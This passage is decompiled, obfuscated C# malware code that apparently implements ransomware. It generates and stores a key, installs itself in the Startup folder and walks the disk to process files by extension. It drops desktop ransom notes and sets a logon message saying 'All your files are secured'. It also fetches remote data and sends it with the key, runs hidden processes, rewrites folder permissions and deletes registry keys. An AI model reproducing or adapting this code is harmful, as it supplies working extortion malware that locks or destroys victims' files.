							string[] array3 = text4.Split(new char[1] { ',' });
							foreach (string text5 in array3)
							{
								string text6 = text5.Trim();
								if (Directory.Exists(text6) && !ZmKssmQIdPi.Contains(text6) && text6 != getString_0(107396717) && text6 != getString_0(107396664) && text6 != getString_0(107396675))
								{
									ZmKssmQIdPi.Add(text6);
								}
							}
						}
					}
					if (text3.Contains(getString_0(107396646)))
					{
						string text4 = text3.Split(new char[1] { '=' })[1].Trim();
						if (!string.IsNullOrEmpty(text4) && text4.ToLower() == getString_0(107396601))
						{
							SbkfEriDLMxWh = getString_0(107396791);
						}
						else if (!string.IsNullOrEmpty(text4) && text4.ToLower() == getString_0(107396624))
						{
							SbkfEriDLMxWh = getString_0(107396615);
						}
					}
					if (text3.Contains(getString_0(107396578)))
					{
						string text4 = text3.Split(new char[1] { '=' })[1].Trim();
						if (!string.IsNullOrEmpty(text4) && text4.ToLower() == getString_0(107396601))
						{
							fgLeGcGjPkpRXH = true;
						}
						else if (!string.IsNullOrEmpty(text4) && text4.ToLower() == getString_0(107396624))
						{
							fgLeGcGjPkpRXH = true;
						}
					}
					if (text3.Contains(getString_0(107396593)))
					{
						string text4 = text3.Split(new char[1] { '=' })[1].Trim();
						if (!string.IsNullOrEmpty(text4) && text4.ToLower() == getString_0(107396601))
						{
							CCDyMIHlAe = true;
						}
						else if (!string.IsNullOrEmpty(text4) && text4.ToLower() == getString_0(107396624))
						{
							CCDyMIHlAe = false;
						}
					}
					if (text3.Contains(getString_0(107396580)))
					{
						string text4 = text3.Split(new char[1] { '=' })[1].Trim();
						if (!string.IsNullOrEmpty(text4) && text4.ToLower() == getString_0(107396601))
						{
							RaNDyCdUClri = true;
						}
						else if (!string.IsNullOrEmpty(text4) && text4.ToLower() == getString_0(107396624))
						{
							RaNDyCdUClri = true;
						}
					}
				}
			}
		}
		catch (Exception ex6)
		{
			if (CCDyMIHlAe)
			{
				try
				{
					File.AppendAllText(dtHHyJMWMTcTg, getString_0(107396551) + ex6.Message);
				}
				catch (Exception)
				{
				}
			}
		}
		if (SbkfEriDLMxWh == getString_0(107396615))
		{
			fcvtrBGAMxdDFLpko();
		}
		try
		{
			if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator) && FRIhZgoxuuhF)
			{
				try
				{
					Thread thread4 = new Thread(xthKWmEVlgYHOS.OGRDaEslLrcJ);
					thread4.IsBackground = true;
					thread4.Start();
				}
				catch
				{
				}
			}
		}
		catch (Exception)
		{
		}
		if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
		{
			xNqiyNeJTVFGU(getString_0(107396474), PbsdnvfpwWRvGCs(getString_0(107396493)));
		}
		SecureString secureString = new SecureString();
		if (SSLjTeVGTsW == getString_0(107396615))
		{
			MXXPCoXZKEzPC = OgnUgpogJqEQzj.cjldtZrLHSYUB(32);
			sTQyJSLcZOIiC = OgnUgpogJqEQzj.vYlLBcysurxM();
		}
		else
		{
			MXXPCoXZKEzPC = getString_0(107395908);
		}
		EXVykcHaTCNay = vWsKVhBCwQW.nPhDaoiHjN(MXXPCoXZKEzPC + sTQyJSLcZOIiC);
		try
		{
			if (!PAOJgADrbjEa)
			{
				RegistryKey registryKey = Registry.CurrentUser.CreateSubKey(PbsdnvfpwWRvGCs(getString_0(107395831)));
				if (registryKey != null)
				{
					registryKey.SetValue(PbsdnvfpwWRvGCs(getString_0(107395818)) + (registryKey.ValueCount + 1), EXVykcHaTCNay);
					registryKey.Close();
				}
			}
			else
			{
				RegistryKey registryKey = Registry.CurrentUser.CreateSubKey(PbsdnvfpwWRvGCs(getString_0(107395831)));
				if (registryKey != null && registryKey.ValueCount == 0)
				{
					registryKey.SetValue(PbsdnvfpwWRvGCs(getString_0(107395818)) + (registryKey.ValueCount + 1), EXVykcHaTCNay);
					registryKey.Close();
				}
				else if (registryKey != null && registryKey.ValueCount != 0)
				{
					registryKey.Close();
				}
			}
		}
		catch (Exception)
		{
			AngOozHSWJQ = true;
		}
		if (CvhuRhPbSX == getString_0(107396791))
		{
			xLkmmTTSHp();
		}
		if (XdhdhAwnktmq)
		{
			try
			{
				if (!File.Exists(Path.Combine(Directory.GetCurrentDirectory(), muQSQoYNOwJp)))
				{
					File.WriteAllText(Path.Combine(Directory.GetCurrentDirectory(), muQSQoYNOwJp), string.Concat(PbsdnvfpwWRvGCs(getString_0(107395777)), new WebClient().DownloadString(PbsdnvfpwWRvGCs(getString_0(107395784))), getString_0(107395711), PbsdnvfpwWRvGCs(getString_0(107395706)), DateTime.Now, getString_0(107395711), PbsdnvfpwWRvGCs(getString_0(107396209)), EXVykcHaTCNay));
				}
				else
				{
					File.AppendAllText(Path.Combine(Directory.GetCurrentDirectory(), muQSQoYNOwJp), getString_0(107396120) + EXVykcHaTCNay);
				}
			}
			catch (Exception ex10)
			{
				if (CCDyMIHlAe)
				{
					try
					{
						File.AppendAllText(dtHHyJMWMTcTg, getString_0(107396091) + ex10.Message + getString_0(107395711));
					}
					catch (Exception)
					{
					}
				}
			}
		}
		if (!LoAUTpZIRmiA)
		{
			MmDeYkRWOPOsT.rXfQNjqsTzg(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Startup), RoiBxbbYOpTnzdF), iqbhckCLJPzmcb(EXVykcHaTCNay), null, null, getString_0(107396074), getString_0(107396025), null);
		}
		if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
		{
			XoFivSFAPFl();
		}
		try
		{
			try
			{
				if (fgLeGcGjPkpRXH)
				{
					Console.WriteLine(getString_0(107396040));
				}
			}
			catch
			{
			}
			LeefKZPaDd(new string[1] { getString_0(107395959) }, new string[100]
			{
				getString_0(107395982),
				getString_0(107395977),
				getString_0(107395972),
				getString_0(107395419),
				getString_0(107395414),
				getString_0(107395441),
				getString_0(107395436),
				getString_0(107395431),
				getString_0(107395394),
				getString_0(107395389),
				getString_0(107395384),
				getString_0(107395379),
				getString_0(107395402),
				getString_0(107395397),
				getString_0(107395356),
				getString_0(107395351),
				getString_0(107395378),
				getString_0(107395373),
				getString_0(107395368),
				getString_0(107395363),
				getString_0(107395322),
				getString_0(107395317),
				getString_0(107395344),
				getString_0(107395339),
				getString_0(107395334),
				getString_0(107395297),
				getString_0(107395292),
				getString_0(107395287),
				getString_0(107395314),
				getString_0(107395309),
				getString_0(107395304),
				getString_0(107395299),
				getString_0(107395262),
				getString_0(107395257),
				getString_0(107395280),
				getString_0(107395275),
				getString_0(107395270),
				getString_0(107395233),
				getString_0(107395436),
				getString_0(107395228),
				getString_0(107395394),
				getString_0(107395219),
				getString_0(107395246),
				getString_0(107395241),
				getString_0(107395236),
				getString_0(107395199),
				getString_0(107395194),
				getString_0(107395189),
				getString_0(107395216),
				getString_0(107395211),
				getString_0(107395206),
				getString_0(107395681),
				getString_0(107395676),
				getString_0(107395671),
				getString_0(107395698),
				getString_0(107395693),
				getString_0(107395688),
				getString_0(107395683),
				getString_0(107395642),
				getString_0(107395637),
				getString_0(107395660),
				getString_0(107395615),
				getString_0(107395228),
				getString_0(107395634),
				getString_0(107395625),
				getString_0(107395584),
				getString_0(107395575),
				getString_0(107395598),
				getString_0(107395589),
				getString_0(107395552),
				getString_0(107395543),
				getString_0(107395566),
				getString_0(107395557),
				getString_0(107395520),
				getString_0(107395515),
				getString_0(107395510),
				getString_0(107395537),
				getString_0(107395532),
				getString_0(107395527),
				getString_0(107395486),
				getString_0(107395481),
				getString_0(107395476),
				getString_0(107395503),
				getString_0(107395498),
				getString_0(107395493),
				getString_0(107395452),
				getString_0(107395443),
				getString_0(107395470),
				getString_0(107395262),
				getString_0(107395465),
				getString_0(107395460),
				getString_0(107394911),
				getString_0(107394906),
				getString_0(107394901),
				getString_0(107394924),
				getString_0(107394919),
				getString_0(107394882),
				getString_0(107394873),
				getString_0(107394868),
				getString_0(107394895)
			}, new string[0], MXXPCoXZKEzPC, getString_0(107394890));
		}
		catch (Exception ex6)
		{
			if (CCDyMIHlAe)
			{
				try
				{
					File.AppendAllText(dtHHyJMWMTcTg, getString_0(107394845) + ex6.Message);
				}
				catch (Exception)
				{
				}
			}
			try
			{
				secureString.Dispose();
			}
			catch
			{
			}
		}
		try
		{
			secureString.Dispose();
		}
		catch
		{
		}
		if (!LoAUTpZIRmiA || AngOozHSWJQ)
		{
			try
			{
				if (!File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107394852)))
				{
					using StreamWriter streamWriter = new StreamWriter(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107394852));
					streamWriter.WriteLine(PbsdnvfpwWRvGCs(getString_0(107394819)).Replace(getString_0(107390385), yWTIBbUKdpiy.RuDYtoNcCxI()).Replace(getString_0(107390376), Environment.UserName).Replace(getString_0(107390327), Environment.MachineName)
						.Replace(getString_0(107389794), Environment.UserDomainName));
					streamWriter.WriteLine(getString_0(107395711));
					if (CoyMCdqKPDBfCk || !PAOJgADrbjEa)
					{
						streamWriter.WriteLine(PbsdnvfpwWRvGCs(getString_0(107389809)));
						streamWriter.WriteLine(EXVykcHaTCNay);
					}
					if (rmNaxrdaErS == getString_0(107396615))
					{
						streamWriter.WriteLine(getString_0(107395711));
						streamWriter.WriteLine(PbsdnvfpwWRvGCs(getString_0(107389760)) + Convert.ToString(SNtBTLidlROtoV.Count));
					}
					if (YazilaoopZ)
					{
						streamWriter.WriteLine(getString_0(107395711));
						streamWriter.WriteLine(PbsdnvfpwWRvGCs(getString_0(107389683)));
						streamWriter.WriteLine(yWTIBbUKdpiy.RuDYtoNcCxI());
					}
				}
				else
				{
					string text7 = File.ReadAllText(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107394852));
					if (!text7.Contains(EXVykcHaTCNay) && !PAOJgADrbjEa)
					{
						File.AppendAllText(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107394852), getString_0(107389682) + EXVykcHaTCNay);
					}
				}
			}
			catch (Exception ex6)
			{
				if (CCDyMIHlAe)
				{
					try
					{
						File.AppendAllText(dtHHyJMWMTcTg, getString_0(107389621) + ex6.Message + getString_0(107395711));
					}
					catch (Exception)
					{
					}
				}
			}
			int num = 0;
			foreach (string item in HMEbcaxMfcYzgl)
			{
				num++;
				try
				{
					if (item == Environment.GetFolderPath(Environment.SpecialFolder.Desktop))
					{
						continue;
					}
				}
				catch
				{
				}
				try
				{
					if (!File.Exists(item + getString_0(107394852)))
					{
						File.Copy(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107394852), item + getString_0(107394852), overwrite: true);
					}
					else
					{
						string text7 = File.ReadAllText(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107394852));
						if (!text7.Contains(EXVykcHaTCNay) && !PAOJgADrbjEa)
						{
							File.AppendAllText(item + getString_0(107394852), getString_0(107389682) + EXVykcHaTCNay);
						}
					}
				}
				catch (Exception ex6)
				{
					if (CCDyMIHlAe)
					{
						try
						{
							File.AppendAllText(dtHHyJMWMTcTg, getString_0(107389621) + ex6.Message + getString_0(107395711));
						}
						catch (Exception)
						{
						}
					}
				}
				if (!ZaxDTmLwAHHZwVkZ && num > 10)
				{
					break;
				}
			}
		}
		if ((cuUuUUMpmxH == getString_0(107396791) && !LoAUTpZIRmiA) || (cuUuUUMpmxH == getString_0(107396791) && AngOozHSWJQ))
		{
			try
			{
				if (!File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107389608)))
				{
					using StreamWriter streamWriter = new StreamWriter(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107389608));
					streamWriter.WriteLine(PbsdnvfpwWRvGCs(getString_0(107389575)).Replace(getString_0(107390385), yWTIBbUKdpiy.RuDYtoNcCxI()).Replace(getString_0(107390376), Environment.UserName).Replace(getString_0(107390327), Environment.MachineName)
						.Replace(getString_0(107389794), Environment.UserDomainName));
					streamWriter.WriteLine(getString_0(107395711));
					if (CoyMCdqKPDBfCk || !PAOJgADrbjEa)
					{
						streamWriter.WriteLine(PbsdnvfpwWRvGCs(TfBMtOaYnyXfeqqRN(getString_0(107390038))));
						streamWriter.WriteLine(EXVykcHaTCNay + PbsdnvfpwWRvGCs(getString_0(107389997)));
					}
					if (rmNaxrdaErS == getString_0(107396615))
					{
						streamWriter.WriteLine(getString_0(107395711));
						streamWriter.WriteLine(PbsdnvfpwWRvGCs(getString_0(107389952)) + PbsdnvfpwWRvGCs(getString_0(107389760)) + Convert.ToString(SNtBTLidlROtoV.Count) + PbsdnvfpwWRvGCs(getString_0(107389997)));
					}
					if (YazilaoopZ)
					{
						streamWriter.WriteLine(getString_0(107395711));
						streamWriter.WriteLine(PbsdnvfpwWRvGCs(getString_0(107389683)));
						streamWriter.WriteLine(yWTIBbUKdpiy.RuDYtoNcCxI());
					}
				}
				else
				{
					string text7 = File.ReadAllText(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107394852));
					if (!text7.Contains(EXVykcHaTCNay) && !PAOJgADrbjEa)
					{
						File.AppendAllText(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107389608), PbsdnvfpwWRvGCs(getString_0(107389952)) + getString_0(107389682) + EXVykcHaTCNay + PbsdnvfpwWRvGCs(getString_0(107389997)));
					}
				}
			}
			catch (Exception ex6)
			{
				if (CCDyMIHlAe)
				{
					try
					{
						File.AppendAllText(dtHHyJMWMTcTg, getString_0(107389923) + ex6.Message + getString_0(107395711));
					}
					catch (Exception)
					{
					}
				}
			}
		}
		if (OcAolhvchhcmQ == getString_0(107396791))
		{
			try
			{
				if (rmNaxrdaErS == getString_0(107396615))
				{
					yWTIBbUKdpiy.gmIyowWwkfSR(getString_0(107389866), getString_0(107389861), getString_0(107389816), string.Concat(PbsdnvfpwWRvGCs(getString_0(107395777)), new WebClient().DownloadString(PbsdnvfpwWRvGCs(getString_0(107395784))), getString_0(107389839), PbsdnvfpwWRvGCs(getString_0(107395706)), DateTime.Now, getString_0(107395711), PbsdnvfpwWRvGCs(getString_0(107389834)), Convert.ToString(SNtBTLidlROtoV.Count), getString_0(107395711), PbsdnvfpwWRvGCs(getString_0(107396209)), EXVykcHaTCNay));
				}
				else
				{
					yWTIBbUKdpiy.gmIyowWwkfSR(getString_0(107389866), getString_0(107389861), getString_0(107389816), string.Concat(PbsdnvfpwWRvGCs(getString_0(107395777)), new WebClient().DownloadString(PbsdnvfpwWRvGCs(getString_0(107395784))), getString_0(107389839), PbsdnvfpwWRvGCs(getString_0(107395706)), DateTime.Now, getString_0(107395711), PbsdnvfpwWRvGCs(getString_0(107389834)), Convert.ToString(SNtBTLidlROtoV.Count), getString_0(107395711), PbsdnvfpwWRvGCs(getString_0(107396209)), EXVykcHaTCNay));
				}
			}
			catch
			{
			}
		}
		if (DhKuNmjsjM == getString_0(107396791))
		{
			try
			{
				uhnJdcZsoCQU.LlIJhyFJOrlN(new Uri(getString_0(107389241)));
			}
			catch
			{
			}
		}
		if (cuUuUUMpmxH == getString_0(107396615) && !LoAUTpZIRmiA)
		{
			try
			{
				if (File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107394852)))
				{
					Process.Start(PbsdnvfpwWRvGCs(getString_0(107389240)), Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107394852));
				}
			}
			catch
			{
			}
		}
		else if (cuUuUUMpmxH == getString_0(107396791) && !LoAUTpZIRmiA)
		{
			try
			{
				if (File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107389608)))
				{
					Process.Start(PbsdnvfpwWRvGCs(getString_0(107389215)), Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107389608));
				}
			}
			catch
			{
			}
		}
		if (CvhuRhPbSX == getString_0(107396791))
		{
			if (bUDblfHLHXAcgkB == getString_0(107396791) && !string.IsNullOrEmpty(vClGBOKLiQn) && !string.IsNullOrEmpty(EiyrcFiAoaX))
			{
				IFejWFEgPmICZiW(vClGBOKLiQn, EiyrcFiAoaX);
			}
			else
			{
				IFejWFEgPmICZiW(getString_0(107389230), getString_0(107389201));
			}
		}
		if (YwXcfYcDlzL != getString_0(107389535))
		{
			pkNBJGqTbajgL(YwXcfYcDlzL);
		}
		if (!string.IsNullOrEmpty(fKcZCslCfAJPz))
		{
			try
			{
				File.Delete(fKcZCslCfAJPz);
			}
			catch
			{
			}
		}
		try
		{
			if (File.Exists(Path.Combine(Directory.GetCurrentDirectory(), getString_0(107396211))))
			{
				File.Delete(Path.Combine(Directory.GetCurrentDirectory(), getString_0(107396211)));
			}
		}
		catch (Exception ex10)
		{
			try
			{
				File.AppendAllText(dtHHyJMWMTcTg, getString_0(107389550) + ex10.Message);
			}
			catch (Exception)
			{
			}
		}
		if (CCDyMIHlAe)
		{
			try
			{
				File.AppendAllText(dtHHyJMWMTcTg, getString_0(107389473));
			}
			catch (Exception)
			{
			}
		}
		if (gheRqfduEuJ == getString_0(107389460))
		{
			OQGiATnqshpg();
		}
	}

	public static void OvqakdodhLDH()
	{
		//IL_0030: Unknown result type (might be due to invalid IL or missing references)
		MessageBox.Show(PbsdnvfpwWRvGCs(TfBMtOaYnyXfeqqRN(getString_0(107389483))), PbsdnvfpwWRvGCs(getString_0(107389230)), (MessageBoxButtons)0, (MessageBoxIcon)16);
	}

	private static int EwHBDgtvrOMYeg(int int_0, int int_1)
	{
		RNGCryptoServiceProvider rNGCryptoServiceProvider = new RNGCryptoServiceProvider();
		byte[] array = new byte[4];
		rNGCryptoServiceProvider.GetBytes(array);
		int seed = BitConverter.ToInt32(array, 0);
		return new Random(seed).Next(int_0, int_1);
	}

	public static List<string> DrqYGjBvTosyB(string string_0, string[] string_1, string string_2, string[] string_3, string string_4)
	{
		List<string> list = new List<string>();
		Stack<string> stack = new Stack<string>(20);
		stack.Push(string_0);
		while (stack.Count > 0)
		{
			string text = stack.Pop();
			string[] directories;
			try
			{
				directories = Directory.GetDirectories(text);
			}
			catch
			{
				continue;
			}
			string[] array = null;
			try
			{
				if ((text.Contains(getString_0(107389329)) || text.Contains(getString_0(107388760)) || text.Contains(getString_0(107388727)) || text.ToLower().Contains(getString_0(107388742)) || text.ToLower().Contains(getString_0(107388697)) || text.Contains(getString_0(107388672)) || text.Contains(getString_0(107388683)) || text.ToLower().Contains(getString_0(107388638)) || text.ToLower().Contains(getString_0(107388657)) || text.ToLower().Contains(getString_0(107388620)) || text.ToLower().Contains(getString_0(107388611)) || text.ToLower().Contains(getString_0(107388594)) || text.ToLower().Contains(getString_0(107388581)) || text.ToLower().Contains(getString_0(107388536)) || text.ToLower().Contains(getString_0(107388547))) && !text.Contains(PbsdnvfpwWRvGCs(getString_0(107389034))))
				{
					continue;
				}
				array = Directory.GetFiles(text);
				goto IL_0210;
			}
			catch
			{
			}
			continue;
			IL_0210:
			string[] array2 = array;
			foreach (string fileName in array2)
			{
				try
				{
					FileInfo fileInfo = new FileInfo(fileName);
					if (!fileInfo.FullName.Contains(getString_0(107388961)) && !fileInfo.FullName.Contains(getString_0(107388976)) && !fileInfo.FullName.Contains(getString_0(107388927)) && !fileInfo.FullName.Contains(getString_0(107388942)) && !fileInfo.FullName.Contains(getString_0(107388893)) && !fileInfo.FullName.Contains(getString_0(107388908)) && !fileInfo.FullName.Contains(getString_0(107388859)) && !fileInfo.FullName.Contains(getString_0(107388874)) && !fileInfo.FullName.Contains(getString_0(107388829)) && !fileInfo.FullName.Contains(getString_0(107388840)) && !fileInfo.FullName.ToLower().Contains(getString_0(107388795)) && !fileInfo.FullName.ToLower().Contains(getString_0(107388814)) && !fileInfo.FullName.ToLower().Contains(getString_0(107388253)) && !fileInfo.FullName.ToLower().Contains(getString_0(107388268)) && !fileInfo.FullName.Contains(PbsdnvfpwWRvGCs(getString_0(107388219))) && !fileInfo.FullName.Contains(getString_0(107388194)) && !fileInfo.FullName.Contains(getString_0(107396211)) && !fileInfo.FullName.Contains(getString_0(107388181)) && !fileInfo.FullName.EndsWith(getString_0(107394890)) && !fileInfo.FullName.EndsWith(getString_0(107388156)) && !fileInfo.FullName.EndsWith(getString_0(107388151)) && !fileInfo.FullName.EndsWith(getString_0(107388178)) && !fileInfo.FullName.EndsWith(getString_0(107388173)) && !fileInfo.FullName.Contains(getString_0(107388168)) && !fileInfo.FullName.Contains(RoiBxbbYOpTnzdF) && !fileInfo.FullName.Contains(dtHHyJMWMTcTg) && !fileInfo.FullName.Contains(muQSQoYNOwJp))
					{
						if (File.Exists(fileInfo.FullName) && (double)fileInfo.Length <= double.Parse(nsiwXjKpMUO) * 1024.0 * 1024.0 && HirTGWkSHczrmbY == getString_0(107396791))
						{
							list.Add(fileInfo.FullName);
							bDKhtlXUmUD(list, string_1, string_2, string_3, string_4);
							list.Clear();
						}
						else if (File.Exists(fileInfo.FullName) && HirTGWkSHczrmbY == getString_0(107396615))
						{
							list.Add(fileInfo.FullName);
							bDKhtlXUmUD(list, string_1, string_2, string_3, string_4);
							list.Clear();
						}
					}
				}
				catch
				{
				}
			}
			array2 = directories;
			foreach (string item in array2)
			{
				stack.Push(item);
			}
		}
		return list;
	}

	public static void fcvtrBGAMxdDFLpko()
	{
		//IL_000f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0015: Expected O, but got Unknown
		//IL_002d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0033: Expected O, but got Unknown
		ManagementObjectSearcher val = new ManagementObjectSearcher(getString_0(107388119));
		ManagementObjectEnumerator enumerator = val.Get().GetEnumerator();
		try
		{
			while (enumerator.MoveNext())
			{
				ManagementObject val2 = (ManagementObject)enumerator.get_Current();
				if (!ZmKssmQIdPi.Contains(((object)val2.get_Path()).ToString()!.Split(new char[1] { '=' })[1].ToString().Replace(getString_0(107388066), getString_0(107397225)).Replace(getString_0(107388061), getString_0(107388066))
					.Replace(getString_0(107388052), getString_0(107389241))
					.Split(new char[1] { '(' })[0].Trim()))
				{
					ZmKssmQIdPi.Add(((object)val2.get_Path()).ToString()!.Split(new char[1] { '=' })[1].ToString().Replace(getString_0(107388066), getString_0(107397225)).Replace(getString_0(107388061), getString_0(107388066))
						.Replace(getString_0(107388052), getString_0(107389241))
						.Split(new char[1] { '(' })[0].Trim().Replace(getString_0(107388079), getString_0(107389241)));
				}
			}
		}
		finally
		{
			((IDisposable)enumerator)?.Dispose();
		}
	}

	public static string xNqiyNeJTVFGU(string mqlAQbICKLKtA = "", string NmrYzUWTFAwHib = "")
	{
		string result = getString_0(107389241);
		try
		{
			Process process = new Process();
			process.StartInfo = new ProcessStartInfo
			{
				WindowStyle = ProcessWindowStyle.Hidden,
				CreateNoWindow = true,
				FileName = mqlAQbICKLKtA,
				Arguments = NmrYzUWTFAwHib,
				UseShellExecute = false,
				RedirectStandardOutput = true,
				StandardOutputEncoding = Encoding.GetEncoding(850)
			};
			Process process2 = process;
			process2.Start();
			result = process2.StandardOutput.ReadToEnd();
			process2.WaitForExit(2500);
			process2.Kill();
		}
		catch
		{
		}
		return result;
	}

	public static void ubalMIbEpbeY(string string_0)
	{
		Process process = new Process();
		process.StartInfo = new ProcessStartInfo
		{
			FileName = getString_0(107388070),
			Arguments = string_0,
			WindowStyle = ProcessWindowStyle.Hidden,
			CreateNoWindow = true
		};
		Process process2 = process;
		process2.Start();
	}

	public static string TfBMtOaYnyXfeqqRN(string string_0)
	{
		char[] array = string_0.ToCharArray();
		Array.Reverse((Array)array);
		return new string(array);
	}

	public static string PbsdnvfpwWRvGCs(string string_0)
	{
		byte[] bytes = Convert.FromBase64String(string_0);
		return Encoding.UTF8.GetString(bytes);
	}

	public static void NHzvTatQZhTwKonTK(string FIvCezCBJIFuJ = "", string KIIbYrKbucelZ = "SW5mb3JtYXRpb24uLi4=", string OFNVwgWVfswlvJj = "QWxsIHlvdXIgZmlsZXMgYXJlIHNlY3VyZWQsIHBsZWFzZSByZWFkIHRoZSB0ZXh0IG5vdGUgbG9jYXRlZCBpbiB5b3VyIGRlc2t0b3AuLi4=")
	{
		FIvCezCBJIFuJ = TfBMtOaYnyXfeqqRN(getString_0(107388021));
		try
		{
			RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(PbsdnvfpwWRvGCs(FIvCezCBJIFuJ), writable: true);
			if (registryKey != null)
			{
				registryKey.SetValue(PbsdnvfpwWRvGCs(getString_0(107388436)), PbsdnvfpwWRvGCs(KIIbYrKbucelZ));
				registryKey.SetValue(PbsdnvfpwWRvGCs(getString_0(107388403)), PbsdnvfpwWRvGCs(OFNVwgWVfswlvJj));
				registryKey.Close();
			}
		}
		catch
		{
		}
		try
		{
			FIvCezCBJIFuJ = TfBMtOaYnyXfeqqRN(getString_0(107388374));
			RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(PbsdnvfpwWRvGCs(FIvCezCBJIFuJ), writable: true);
			if (registryKey != null)
			{
				registryKey.SetValue(PbsdnvfpwWRvGCs(getString_0(107388301)), PbsdnvfpwWRvGCs(KIIbYrKbucelZ));
				registryKey.SetValue(PbsdnvfpwWRvGCs(getString_0(107387756)), PbsdnvfpwWRvGCs(OFNVwgWVfswlvJj));
				registryKey.Close();
			}
		}
		catch
		{
		}
	}

	public static void xLkmmTTSHp()
	{
		try
		{
			if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
			{
				if (bUDblfHLHXAcgkB == getString_0(107396791) && !string.IsNullOrEmpty(vClGBOKLiQn) && !string.IsNullOrEmpty(EiyrcFiAoaX))
				{
					NHzvTatQZhTwKonTK(getString_0(107389241), vClGBOKLiQn, EiyrcFiAoaX);
				}
				else
				{
					NHzvTatQZhTwKonTK(getString_0(107389241), getString_0(107389230), getString_0(107389201));
				}
			}
		}
		catch
		{
		}
	}

	public static void IFejWFEgPmICZiW(string iKyctWUHNaEkVj = "SW5mb3JtYXRpb24uLi4=", string UwFkiThTFY = "QWxsIHlvdXIgZmlsZXMgYXJlIHNlY3VyZWQsIHBsZWFzZSByZWFkIHRoZSB0ZXh0IG5vdGUgbG9jYXRlZCBpbiB5b3VyIGRlc2t0b3AuLi4=")
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_0006: Expected O, but got Unknown
		NotifyIcon val = new NotifyIcon();
		val.set_Icon(SystemIcons.get_Warning());
		val.set_Visible(true);
		val.set_BalloonTipIcon((ToolTipIcon)2);
		val.set_BalloonTipTitle(PbsdnvfpwWRvGCs(iKyctWUHNaEkVj));
		val.set_BalloonTipText(PbsdnvfpwWRvGCs(UwFkiThTFY));
		val.ShowBalloonTip(30000);
	}

	public static void pkNBJGqTbajgL(string string_0)
	{
		string text = WindowsIdentity.GetCurrent().Name.Split(new char[1] { '\\' })[1].ToString();
		xNqiyNeJTVFGU(PbsdnvfpwWRvGCs(getString_0(107387727)), getString_0(107387678) + text + getString_0(107387669) + string_0);
	}

	public static void wDQhPDGrMto(string string_0)
	{
		ProcessStartInfo processStartInfo = new ProcessStartInfo();
		processStartInfo.FileName = PbsdnvfpwWRvGCs(getString_0(107387696));
		processStartInfo.Arguments = getString_0(107387635) + string_0;
		processStartInfo.RedirectStandardError = true;
		processStartInfo.RedirectStandardOutput = true;
		processStartInfo.UseShellExecute = false;
		processStartInfo.CreateNoWindow = true;
		Process process = new Process();
		process.StartInfo = processStartInfo;
		process.Start();
	}

	private static bool sMlBAtMqAgeMq(string string_0, string string_1)
	{
		try
		{
			FileSystemAccessRule rule = new FileSystemAccessRule(string_0, FileSystemRights.FullControl, InheritanceFlags.None, PropagationFlags.NoPropagateInherit, AccessControlType.Allow);
			DirectoryInfo directoryInfo = new DirectoryInfo(string_1);
			DirectorySecurity accessControl = directoryInfo.GetAccessControl(AccessControlSections.Access);
			accessControl.ModifyAccessRule(AccessControlModification.Set, rule, out var modified);
			if (!modified)
			{
				return false;
			}
			rule = new FileSystemAccessRule(string_0, FileSystemRights.FullControl, InheritanceFlags.ContainerInherit | InheritanceFlags.ObjectInherit, PropagationFlags.InheritOnly, AccessControlType.Allow);
			accessControl.ModifyAccessRule(AccessControlModification.Add, rule, out modified);
			if (!modified)
			{
				return false;
			}
			directoryInfo.SetAccessControl(accessControl);
			return true;
		}
		catch (Exception)
		{
			return false;
		}
	}

	public static bool CRggSgCOOkjunf(string string_0)
	{
		try
		{
			NxIyepnTFBO CS_0024_003C_003E8__locals0 = new NxIyepnTFBO();
			DriveInfo[] drives = DriveInfo.GetDrives();
			CS_0024_003C_003E8__locals0.nvRebewysN = Path.GetPathRoot(string_0);
			DriveInfo driveInfo = drives.FirstOrDefault((DriveInfo driveInfo_0) => driveInfo_0.RootDirectory.Name == CS_0024_003C_003E8__locals0.nvRebewysN);
			return driveInfo != null && driveInfo.DriveFormat == getString_0(107387662);
		}
		catch
		{
			return false;
		}
	}

	public static void aURDBxqxWYKvx()
	{
		try
		{
			if (!new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
			{
				return;
			}
			string string_ = TfBMtOaYnyXfeqqRN(getString_0(107387653));
			try
			{
				RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(PbsdnvfpwWRvGCs(string_), writable: true);
				if (registryKey != null)
				{
					registryKey.DeleteSubKey(PbsdnvfpwWRvGCs(getString_0(107387995)));
					registryKey.DeleteSubKey(PbsdnvfpwWRvGCs(getString_0(107387970)));
					registryKey.DeleteSubKey(PbsdnvfpwWRvGCs(getString_0(107387985)));
					registryKey.DeleteSubKey(PbsdnvfpwWRvGCs(getString_0(107387928)));
					registryKey.DeleteSubKey(PbsdnvfpwWRvGCs(getString_0(107387696)));
					registryKey.DeleteSubKey(PbsdnvfpwWRvGCs(getString_0(107387903)));
